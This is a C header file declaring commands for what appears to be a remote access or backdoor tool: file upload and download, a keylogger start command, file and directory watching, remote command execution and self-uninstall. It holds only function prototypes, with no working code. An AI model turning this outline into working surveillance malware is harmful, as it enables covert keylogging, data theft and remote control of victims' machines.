#ifndef COMMANDS_H
#define COMMANDS_H

#include <context.h>

int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2,
    uint8_t byte3, uint8_t byte4);

int prompt_stdin(char *buffer, int buf_size);

int cmd_send_file(struct Context *ctx);

int cmd_get_file(struct Context *ctx);

int cmd_start_kl(struct Context *ctx);
int cmd_watch_file(struct Context *ctx);
int cmd_watch_dir(struct Context *ctx);
int cmd_stop(struct Context *ctx);

int cmd_disconnect(struct Context *ctx);

int cmd_remote_run(struct Context *ctx);

int cmd_uninstall(struct Context *ctx);


#endif //COMMANDS_H
